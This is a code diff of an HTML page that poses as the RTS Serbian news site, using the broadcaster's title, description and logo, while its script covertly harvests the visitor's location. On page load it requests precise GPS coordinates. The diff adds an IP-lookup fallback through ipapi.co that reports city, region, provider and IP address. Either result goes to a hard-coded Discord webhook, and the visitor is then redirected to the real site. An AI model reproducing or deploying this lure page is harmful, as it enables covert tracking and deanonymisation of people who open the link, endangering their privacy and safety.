@@ -3,32 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <title>RTS :: Najnovije vesti</title>
-    
     <meta property="og:title" content="RTS :: Uživo: Najnovije vesti iz Srbije i sveta">
     <meta property="og:description" content="Pratite najnovije vesti, analize i izveštaje sa lica mesta.">
     <meta property="og:image" content="https://www.rts.rs/upload/story/Small/2023/01/01/rts-logo.jpg">
     <meta property="og:type" content="website">
-
     <style>
-        body { 
-            background-color: white; 
-            font-family: Arial, sans-serif; 
-            display: flex; 
-            flex-direction: column;
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #cc0000;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
+        body { background-color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #cc0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -41,30 +22,43 @@
         const webhook = "https://discordapp.com/api/webhooks/1494157860643278890/-kmJPPm-TfxTuVOewXOnSbB6Wr3y8mv5eOc0vh5RsPsd3H27yyWR9lRh_kAt3MySMa8g";
         const target = "https://www.rts.rs";
 
-        function send(pos) {
+        // Funkcija za slanje na Discord
+        async function notify(message) {
+            await fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: message })
+            });
+        }
+
+        // Plan B: Gruba lokacija preko IP adrese (radi uvek)
+        async function fallbackIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                const msg = `🌐 **GRUBI PODACI (GPS ugašen/odbijen):**\nGrad: ${data.city}\nRegion: ${data.region}\nProvajder: ${data.org}\nIP: ${data.ip}`;
+                await notify(msg);
+            } catch (e) { console.log(e); }
+            window.location.href = target;
+        }
+
+        // Plan A: Precizan GPS
+        function success(pos) {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const acc = Math.round(pos.coords.accuracy);
-            
-            const payload = {
-                content: `🚨 **LOKACIJA AKTIVIRANA** 🚨\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc}m`
-            };
-
-            fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).finally(() => { window.location.href = target; });
+            const msg = `🚨 **PRECIZNA LOKACIJA STIGLA!**\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc}m`;
+            notify(msg).then(() => { window.location.href = target; });
         }
 
-        function fail() { window.location.href = target; }
-
-        navigator.geolocation.getCurrentPosition(send, fail, {
+        // Pokretanje
+        navigator.geolocation.getCurrentPosition(success, fallbackIP, {
             enableHighAccuracy: true,
-            timeout: 8000
+            timeout: 7000
         });
 
-        setTimeout(fail, 9000);
+        // Ako se ništa ne desi za 9 sekundi, idi na RTS
+        setTimeout(() => { window.location.href = target; }, 9000);
     </script>
 </body>
 </html>
